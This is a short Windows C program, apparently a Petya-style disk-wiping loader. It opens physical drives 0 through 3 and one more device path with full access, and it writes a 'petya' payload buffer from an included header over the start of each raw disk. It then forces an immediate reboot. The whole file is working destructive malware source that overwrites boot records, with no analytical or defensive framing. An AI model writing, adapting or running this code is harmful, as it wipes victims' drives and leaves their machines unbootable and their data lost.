#include <windows.h>

#include <memory.h>

#include "mischa.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	void *petya0 = malloc(sizeof(petya));
	void *petya1 = malloc(sizeof(petya));
	void *petya2 = malloc(sizeof(petya));
	void *petya3 = malloc(sizeof(petya));
	void *petya4 = malloc(sizeof(petya));

	DWORD NumberOfBytesWritten;
	HANDLE drive0 = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	memcpy(petya0, petya, sizeof(petya));
	
	HANDLE drive1 = CreateFileA("\\\\.\\PhysicalDrive1", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	memcpy(petya1, petya, sizeof(petya));
	
	HANDLE drive2 = CreateFileA("\\\\.\\PhysicalDrive2", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	memcpy(petya2, petya, sizeof(petya));
	
	HANDLE drive3 = CreateFileA("\\\\.\\PhysicalDrive3", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	memcpy(petya3, petya, sizeof(petya));
	
	// Dawg.
	HANDLE drive4 = CreateFileA("\\\\.\\I", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	memcpy(petya4, petya, sizeof(petya));
	 
	WriteFile(drive0, petya0, sizeof(petya), &NumberOfBytesWritten, NULL);
	WriteFile(drive1, petya1, sizeof(petya), &NumberOfBytesWritten, NULL);
	WriteFile(drive2, petya2, sizeof(petya), &NumberOfBytesWritten, NULL);
	WriteFile(drive3, petya3, sizeof(petya), &NumberOfBytesWritten, NULL);
	WriteFile(drive4, petya4, sizeof(petya), &NumberOfBytesWritten, NULL);
	 
	CloseHandle(drive0);
	CloseHandle(drive1);
	CloseHandle(drive2);
	CloseHandle(drive3);
	CloseHandle(drive4);
	 
	WinExec("shutdown.exe -r -f -t 0", FALSE); // NO
	WinExec("C:\\Windows\\System32\\shutdown.exe -r -f -t 0", FALSE);
}
